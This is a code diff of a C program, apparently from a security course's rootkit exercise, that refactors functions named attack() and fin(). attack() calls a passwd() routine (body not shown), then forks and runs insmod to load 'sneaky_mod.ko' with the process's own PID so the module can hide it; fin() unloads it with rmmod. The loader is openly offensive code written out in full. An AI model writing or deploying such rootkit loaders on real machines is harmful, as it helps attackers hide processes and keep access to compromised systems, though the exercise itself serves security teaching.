@@ -8,7 +8,6 @@
 #include <errno.h>
 
 int passwd();
-void execute();
 int attack();
 void fin();
 
@@ -16,15 +15,9 @@ int main (int argc, char *argv[]) {
   if (attack() != 0) {
     exit(EXIT_FAILURE);
   }
-
-  while (1) {
+  char in;
+  while ((in = getc(stdin)) != 'q') {
     printf(">>>");
-    char in;
-    in = getchar();
-    printf("\n");
-    if (in = 'q') {
-      break;
-    }
   }
   fin();
   return 0;
@@ -62,49 +55,44 @@ int passwd() {
   return 0;
 }
 
-void execute(char **argv) {
-  pid_t pid;
-  int status;
-  pid = fork();
-  if ( pid < 0 ) {
-    printf("Error: Failed to fork()\n");
-  } else if ( pid == 0 ) {
-    int err = execvp(argv[0], argv);
-    if (err < 0) {
-      printf("Error: exec failed\n");
-      exit(EXIT_FAILURE);
-    }
-  } else {
-    while (wait(&status) != pid) {}
-  }
-}
-
 int attack() {
-  char *argv[4];
-  char pid[16];
-
   if ( passwd() != 0 ) {
     return -1;
   }
 
-  argv[0] = "insmod";
-  argv[1] = "sneaky_mod.ko";
-  snprintf(pid, sizeof(pid), "sneaky_pid=%d", getpid());
-  argv[2] = pid;
-  argv[3] = NULL;
-
-  execute(argv);
+  pid_t pid;
+  pid_t wpid;
+  int status;
+  pid = fork();
+  if (pid == 0) {
+    int sneaky_id = getppid();
+    char buf[128];
+    sprintf(buf, "sneaky_pid=%d", sneaky_id);
+    printf("sneaky_process pid = %d\n", sneaky_id);
+    execlp("insmod", "insmod", "sneaky_mod.ko", buf, NULL);
+  } else {
+    wpid = waitpid(pid, &status, WUNTRACED);
+  }
+  
   return 0;
 }
 
 void fin() {
-  char *argv[3];
-
-  argv[0] = "rmmod";
-  argv[1] = "sneaky_mod.ko";
-  argv[2] = NULL;
-  execute(argv);
-
+  pid_t pid;
+  pid_t wpid;
+  int status;
+  pid = fork();
+  if (pid == 0) {
+    execlp("rmmod", "rmmod", "sneaky_mod.ko", NULL);
+  }else{
+    wpid = waitpid(pid, &status, WUNTRACED);
+    if (WIFEXITED(status)) {
+      printf("%s, %d\n", "program exited with status", WEXITSTATUS(status));
+    }
+    if (WIFSIGNALED(status)) {
+      printf("%s, %d\n", "program was killed by signal", WTERMSIG(status));
+    }
+  }
   int fd1, fd2;
   int err;
   char c;
